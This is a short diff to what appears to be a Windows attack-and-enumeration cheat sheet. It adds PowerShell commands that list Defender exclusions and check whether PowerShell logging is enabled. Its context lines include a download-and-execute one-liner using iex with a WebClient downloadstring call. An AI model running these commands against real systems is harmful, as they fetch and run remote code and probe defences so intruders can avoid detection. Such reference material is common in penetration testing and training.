@@ -37,6 +37,14 @@ powershell -c get-psdrive -psprovider filesystem
 # Show hidden data streams
 dir /R
 
+# List Defender Exclusions (Requires local admin privileges)
+Get-MpPreference | select Exclusion*
+
+# PowerShell Logging Status
+[Bool](Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue).EnableTranscripting
+[Bool](Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging' -ErrorAction SilentlyContinue).EnableModuleLogging
+[Bool](Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -ErrorAction SilentlyContinue).EnableScriptBlockLogging
+
 # Download and execute files
 iex(new-object net.webclient).downloadstring('remote_file')
 ```
